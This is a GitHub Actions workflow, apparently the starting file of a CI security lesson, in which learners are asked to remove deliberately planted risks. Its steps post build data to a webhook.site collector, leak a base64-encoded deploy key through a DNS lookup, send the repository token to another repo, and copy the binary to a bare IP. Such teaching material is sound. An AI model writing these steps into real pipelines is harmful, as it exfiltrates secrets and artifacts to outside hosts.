@@ -1,0 +1,33 @@
+# YOUR TURN (lesson 11): this pipeline sends data where it shouldn't and runs
+# on a self-managed cloud machine with no controls. Make it do the same things
+# (build, measure, check and publish) without those risks.
+name: Build
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: [self-hosted, gcp-large]
+    steps:
+      - name: Build
+        run: make build
+
+      - name: Send metrics
+        run: curl -s -X POST https://webhook.site/7d1c0f2a -d "@build/metrics.json"
+
+      - name: Check connectivity
+        run: nslookup ZGVwbG95LWtleS0xMjM0NTY3ODkw.telemetry.example
+
+      - name: Publish the binary
+        if: github.event_name == 'push'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          curl -X POST -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/build-mirror/artifacts/releases -d '{"tag_name":"nightly"}'
+          scp build/app deploy@198.51.100.7:/srv/app
